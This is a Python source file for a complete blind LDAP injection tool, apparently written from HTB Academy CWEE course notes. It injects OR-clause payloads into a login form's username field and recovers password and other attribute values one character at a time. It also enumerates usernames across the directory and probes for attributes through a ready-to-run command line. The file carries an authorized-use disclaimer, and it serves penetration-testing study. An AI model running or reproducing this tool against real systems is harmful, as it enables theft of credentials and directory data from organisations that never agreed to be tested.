#!/usr/bin/env python3
"""
LDAP Blind Injection Extractor
===============================
A tool implementing the boolean-based blind LDAP injection technique
described in the "LDAP - Data Exfiltration & Blind Exploitation" section of
the CWEE Injection Attacks (HTB Academy path).

Technique recap (from the notes):
  LDAP has no substring()/name()/count() functions like XPath. Instead,
  blind extraction relies on the wildcard `*` operator and prefix growth:

    (&(uid=htb-stdnt)(password=a*))     -> true if password starts with 'a'
    (&(uid=htb-stdnt)(password=p@*))    -> true if password starts with 'p@'
    ...

  Repeating this one character at a time recovers the whole value. The
  injection point that makes this work against *other* users'/attributes
  (not just your own login) is the OR-clause trick:

    username = htb-stdnt)(|(description=a*
    password = invalid)

    -> (&(uid=htb-stdnt)(|(description=a*)(password=invalid)))

  Since the real password is wrong, the OR's truth depends entirely on
  whether `description` starts with 'a' - turning any attribute on any
  entry into a blind oracle, the same way the password itself was exploited.

  Attribute *existence* (which fields a given entry even has) is recovered
  with a wildcard equality test against a dictionary of common LDAP
  attribute names: `(attr=*)` returns true only if the entry has that
  attribute at all (this is schema-driven in LDAP, unlike XPath's
  arbitrary/app-defined XML trees - see the objectClass/inetOrgPerson
  discussion), so there is no generic name()/count() walk to lean on -
  just a wordlist.

USAGE
-----
This script is a *framework*: everything that talks to the actual target
(building the HTTP request and deciding true/false from the response) lives
in the `Oracle` class below. Fill in `send()`/`evaluate_response()` for your
target, then run.

Only use this against systems you are authorized to test (CTF boxes, labs,
your own applications, or engagements you have written permission for).
"""

import argparse
import string
import sys
import time

import requests

DEFAULT_CHARSET = string.ascii_letters + string.digits + "!@#$%^&_-.+"

# LDAP filter metacharacters that must be escaped per RFC 4515 when they
# appear as literal data inside a filter value (not when we deliberately
# use them as filter syntax, e.g. the trailing '*' wildcard we append).
LDAP_ESCAPES = {
    "\\": r"\5c",
    "*": r"\2a",
    "(": r"\28",
    ")": r"\29",
    "\x00": r"\00",
}

# A modest set of common LDAP attribute names to probe for existence.
# Extend/replace with --wordlist for a target-specific schema.
COMMON_ATTRIBUTES = [
    "objectClass", "cn", "sn", "uid", "givenName", "displayName",
    "mail", "userPassword", "password", "description", "telephoneNumber",
    "mobile", "title", "department", "employeeType", "employeeNumber",
    "memberOf", "member", "manager", "homeDirectory", "loginShell",
    "uidNumber", "gidNumber", "gecos", "postalAddress", "l", "o", "ou",
    "street", "st", "postalCode", "c", "createTimestamp", "modifyTimestamp",
    "pwdLastSet", "lastLogon", "sAMAccountName", "userPrincipalName",
    "distinguishedName", "whenCreated", "info", "comment", "notes",
]


def ldap_escape(value: str) -> str:
    return "".join(LDAP_ESCAPES.get(ch, ch) for ch in value)


# ---------------------------------------------------------------------------
# Oracle: everything target-specific lives here.
# ---------------------------------------------------------------------------
class Oracle:
    """
    Wraps the injection point. `is_true(predicate)` sends the raw LDAP
    predicate (e.g. "description=a*" or "objectClass=*") embedded in the
    vulnerable username field, with the OR-clause trick from the notes,
    and returns True/False depending on whether the application's response
    indicates the overall filter matched.

    Matches this pattern from the notes:
        username: <uid>)(|(<predicate>
        password: <password_closer>          (default: "invalid)")
        -> (&(uid=<uid>)(|(<predicate>)(password=<password_closer minus ')'>)))

    Customize `build_payloads` if your target's injectable context differs
    (e.g. a different wrapping attribute, or password field named
    `userPassword` instead of `password`).
    """

    def __init__(self, base_url, username_param, password_param, uid,
                 true_marker=None, password_closer="invalid)",
                 method="POST", extra_params=None, timeout=10,
                 use_timing=False, time_threshold=4.0, session=None):
        self.base_url = base_url
        self.username_param = username_param
        self.password_param = password_param
        self.uid = uid
        self.true_marker = true_marker
        self.password_closer = password_closer
        self.method = method.upper()
        self.extra_params = extra_params or {}
        self.timeout = timeout
        self.use_timing = use_timing
        self.time_threshold = time_threshold
        self.session = session or requests.Session()
        # Usernames to exclude via (!(uid=...)) - used when self.uid is a
        # wildcard ('*') to enumerate multiple distinct entries: each
        # confirmed username gets added here so the next search "moves
        # past" it instead of matching the same one again.
        self.excluded_uids = []

    def build_payloads(self, predicate: str):
        exclusions = "".join(
            f"(!(uid={ldap_escape(u)}))" for u in self.excluded_uids
        )
        username_payload = f"{self.uid}){exclusions}(|({predicate}"
        password_payload = self.password_closer
        return username_payload, password_payload

    def send(self, predicate: str) -> requests.Response:
        username_payload, password_payload = self.build_payloads(predicate)
        params = {
            self.username_param: username_payload,
            self.password_param: password_payload,
            **self.extra_params,
        }
        if self.method == "GET":
            return self.session.get(self.base_url, params=params,
                                     timeout=self.timeout)
        return self.session.post(self.base_url, data=params,
                                  timeout=self.timeout)

    def is_true(self, predicate: str) -> bool:
        if self.use_timing:
            # LDAP has no built-in recursive-count delay trick like XPath's
            # count((//.)[count((//.))]). If your target needs time-based
            # blind mode, wire in an application-specific delay predicate
            # here (e.g. a known-expensive attribute range) or measure
            # baseline vs. injected timing externally.
            start = time.perf_counter()
            self.send(predicate)
            elapsed = time.perf_counter() - start
            return elapsed >= self.time_threshold

        resp = self.send(predicate)
        return self.evaluate_response(resp)

    def evaluate_response(self, resp: requests.Response) -> bool:
        if self.true_marker is not None:
            return self.true_marker in resp.text
        # Fallback heuristic: replace with something reliable for your
        # target (status code, response length threshold, error string).
        return resp.status_code == 200 and len(resp.text) > 0


# ---------------------------------------------------------------------------
# Extraction primitives built on the oracle
# ---------------------------------------------------------------------------
class LDAPBlindExtractor:
    def __init__(self, oracle: Oracle, charset=DEFAULT_CHARSET, max_len=128,
                 verbose=True):
        self.oracle = oracle
        self.charset = charset
        self.max_len = max_len
        self.verbose = verbose

    def _log(self, msg):
        if self.verbose:
            print(f"[*] {msg}", file=sys.stderr)

    def attribute_exists(self, attr: str) -> bool:
        """(attr=*) - true only if the target entry has this attribute."""
        return self.oracle.is_true(f"{attr}=*")

    def discover_attributes(self, wordlist=None) -> list:
        """
        Dictionary-based attribute discovery (LDAP has no generic schema
        walk like XPath's name()/count() - see module docstring). Returns
        the subset of `wordlist` (default: COMMON_ATTRIBUTES) present on
        the target entry.
        """
        words = wordlist or COMMON_ATTRIBUTES
        found = []
        for attr in words:
            if self.attribute_exists(attr):
                self._log(f"[+] attribute present: {attr}")
                found.append(attr)
            else:
                self._log(f"    attribute absent:  {attr}")
        return found

    def discover_users(self, max_users=25) -> list:
        """
        Enumerates distinct usernames directory-wide. Requires the Oracle's
        `uid` to be set to a wildcard ('*') so predicates are evaluated
        against the whole directory rather than one known entry.

        Repeatedly extracts a full `uid` value via get_string(), then adds
        it to oracle.excluded_uids (rendered as (!(uid=<name>))) so the next
        round's wildcard search can't match it again, revealing the next
        distinct entry. Stops when a round finds nothing (no uid matches
        that hasn't already been excluded) or max_users is reached.
        """
        if self.oracle.uid != "*":
            self._log("Warning: discover_users() expects oracle.uid == '*' "
                      "(directory-wide search) - current uid is "
                      f"{self.oracle.uid!r}")

        found = []
        for _ in range(max_users):
            name = self.get_string("uid")
            if not name or name in found:
                self._log(f"discover_users: stopping (no new uid found, "
                          f"got {name!r})")
                break
            self._log(f"[+] found user: {name}")
            found.append(name)
            self.oracle.excluded_uids.append(name)
        return found

    def get_string(self, attr: str, max_len=None) -> str:
        """
        Recovers the string value of `attr` via prefix growth:
        test (attr=<prefix><candidate>*) for each candidate character,
        extend the prefix on the first hit, and stop once the exact value
        (no trailing wildcard) matches on its own.

        Note (from the notes): most LDAP attributes use case-insensitive
        matching, so a hit on a given character does not tell you its
        exact case - only that some case variant matches. For
        case-sensitive secrets, you may need a secondary pass trying both
        cases explicitly once the character set is known.
        """
        max_len = max_len or self.max_len
        prefix = ""
        while len(prefix) < max_len:
            # Termination check: does the exact value (no wildcard) match?
            if prefix and self.oracle.is_true(f"{attr}={ldap_escape(prefix)}"):
                self._log(f"{attr} -> {prefix!r} (complete)")
                return prefix

            extended = False
            for ch in self.charset:
                candidate = prefix + ch
                predicate = f"{attr}={ldap_escape(candidate)}*"
                if self.oracle.is_true(predicate):
                    prefix = candidate
                    extended = True
                    self._log(f"{attr} -> {prefix!r} ({len(prefix)} chars)")
                    break

            if not extended:
                # No character extends the prefix. Either we've silently
                # reached the full value (some directories treat
                # 'value*' and 'value' as equivalent-true here too) or
                # the charset is missing a character actually in the
                # value - widen --charset if this looks premature.
                self._log(f"{attr} -> {prefix!r} (no further characters "
                          f"matched; stopping)")
                return prefix
        self._log(f"{attr} -> hit max_len={max_len}, stopping")
        return prefix

    def dump_attributes(self, attrs, max_len=None) -> dict:
        """Convenience: extract several attributes' values in one call."""
        return {attr: self.get_string(attr, max_len=max_len) for attr in attrs}


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(
        description="Boolean-based blind LDAP injection attribute/value "
                    "extractor (educational use on authorized targets only)."
    )
    parser.add_argument("url", help="Target URL")
    parser.add_argument("--username-param", default="username",
                        help="Name of the vulnerable username form field")
    parser.add_argument("--password-param", default="password",
                        help="Name of the password form field used to "
                             "close the injected filter")
    parser.add_argument("--uid", required=True,
                        help="Known valid username (e.g. htb-stdnt) whose "
                             "entry you are targeting")
    parser.add_argument("--method", default="POST", choices=["GET", "POST"])
    parser.add_argument("--true-marker", default=None,
                        help="Substring present in the response only when "
                             "the injected filter matched (true case)")
    parser.add_argument("--password-closer", default="invalid)",
                        help="Value sent in the password field to close "
                             "the injected filter (default: \"invalid)\")")
    parser.add_argument("--timing", action="store_true",
                        help="Use time-based blind mode instead of content "
                             "match (see Oracle docstring - target-specific)")
    parser.add_argument("--time-threshold", type=float, default=4.0)
    parser.add_argument("--charset", default=DEFAULT_CHARSET)
    parser.add_argument("--max-len", type=int, default=128)
    parser.add_argument("--extra-param", action="append", default=[],
                        help="Additional static request param as key=value "
                             "(repeatable)")

    sub = parser.add_argument_group("what to do")
    sub.add_argument("--discover", action="store_true",
                     help="Run dictionary-based attribute discovery "
                          "instead of extracting a value")
    sub.add_argument("--wordlist", default=None,
                     help="Path to a newline-separated attribute name "
                          "wordlist for --discover (default: built-in list)")
    sub.add_argument("--attr", action="append", default=[],
                     help="Attribute to extract the value of (repeatable, "
                          "e.g. --attr description --attr password)")
    sub.add_argument("--discover-users", action="store_true",
                     help="Enumerate distinct usernames directory-wide "
                          "(requires --uid '*')")
    sub.add_argument("--max-users", type=int, default=25,
                     help="Safety cap for --discover-users (default: 25)")

    args = parser.parse_args()

    extra_params = {}
    for kv in args.extra_param:
        k, _, v = kv.partition("=")
        extra_params[k] = v

    oracle = Oracle(
        base_url=args.url,
        username_param=args.username_param,
        password_param=args.password_param,
        uid=args.uid,
        true_marker=args.true_marker,
        password_closer=args.password_closer,
        method=args.method,
        extra_params=extra_params,
        use_timing=args.timing,
        time_threshold=args.time_threshold,
    )
    extractor = LDAPBlindExtractor(oracle, charset=args.charset,
                                   max_len=args.max_len)

    if args.discover_users:
        users = extractor.discover_users(max_users=args.max_users)
        print(f"\n[+] Users found ({len(users)}):")
        for u in users:
            print(f"  - {u}")
        return

    if args.discover:
        wordlist = None
        if args.wordlist:
            with open(args.wordlist) as f:
                wordlist = [line.strip() for line in f if line.strip()]
        found = extractor.discover_attributes(wordlist)
        print("\n[+] Attributes present on entry "
              f"'{args.uid}':")
        for attr in found:
            print(f"  - {attr}")
        return

    if not args.attr:
        parser.error("specify --attr <name> (repeatable), --discover, or "
                     "--discover-users")

    for attr in args.attr:
        value = extractor.get_string(attr)
        print(f"{attr} = {value!r}")


if __name__ == "__main__":
    main()
